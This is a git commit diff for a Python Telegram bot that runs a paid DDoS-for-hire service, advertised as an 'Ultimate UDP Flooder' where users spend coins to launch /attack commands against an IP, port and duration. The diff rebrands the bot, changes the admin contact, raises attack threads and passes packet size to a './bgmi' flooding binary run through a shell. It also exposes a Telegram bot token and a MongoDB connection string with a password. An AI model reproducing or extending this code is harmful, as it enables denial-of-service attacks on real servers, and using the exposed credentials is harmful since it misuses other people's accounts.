6d52299bf9430400c0a607544df3af54eb8dcf64
Ddos-0182 <telegrambot0001@outlook.com>
2025-03-31 20:30:38 +0530

    Update eng.py

--- eng.py
+++ eng.py
@@ -10,8 +10,8 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '8029979816:AAECAwPvNvlMi7Uk19lvmDq1IgZEkv2s0Bs'
-ADMIN_USER_ID = 1291795330
+TELEGRAM_BOT_TOKEN = '8172790427:AAEBUEptRa6usfEjEbPS3tAzN8qjV22gcX0'
+ADMIN_USER_ID = 7083378335
 MONGO_URI = "mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv"
 DB_NAME = "known"
 COLLECTION_NAME = "users"
@@ -21,7 +21,7 @@ COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 ATTACK_COOLDOWN = 360  # Cooldown period in seconds (5 minutes)
 
 
-threads = 750
+threads = 900
 packet_size = 0
 
 # Global variables for managing cooldowns
@@ -50,7 +50,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🎉 Welcome to the SAIYAM Ultimate UDP Flooder! 🎉*\n\n"
+        "*🎉 Welcome to the NOOB Ultimate UDP Flooder! 🎉*\n\n"
         "*🔥 Experience the pinnacle of hacking with our advanced features! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
         "🚀 *Initiate attacks on your opponents using /attack*\n"
@@ -59,7 +59,7 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ How to Use: ⚠️*\n"
         "*Utilize the commands and type /help for a complete list of commands.*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @tg_maggi*"
+        "*Contact Admin: @TFN_NOOB_XD*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -115,7 +115,7 @@ async def attack(update: Update, context: CallbackContext):
     if user["coins"] < COINS_REQUIRED_PER_ATTACK:
         await context.bot.send_message(
             chat_id=chat_id,
-            text="*💰 Insufficient coins! Please contact the admin to acquire more coins. DM: @tg_maggi*",
+            text="*💰 Insufficient coins! Please contact the admin to acquire more coins. dm- @TFN_NOOB_XD*",
             parse_mode='Markdown'
         )
         return
@@ -196,7 +196,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {threads}"
+        command = f"./bgmi {ip} {port} {duration} {packet_size} {threads}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -254,7 +254,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ SAIYAM VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️ NOOB VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Find everything you need here!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -270,7 +270,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *You're already using this command! It explains all the bot's features.*\n\n"
         "🚨 *Important Tips:* 🚨\n"
         "- *If the bot doesn't reply, it means another user is attacking. Please wait.*\n"
-        "- *If you encounter any issues, contact the admin: @tg_maggi"
+        "- *If you encounter any issues, contact the admin: @TFN_NOOB_XD"
         "💥 *Now go and start your hacking adventures!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
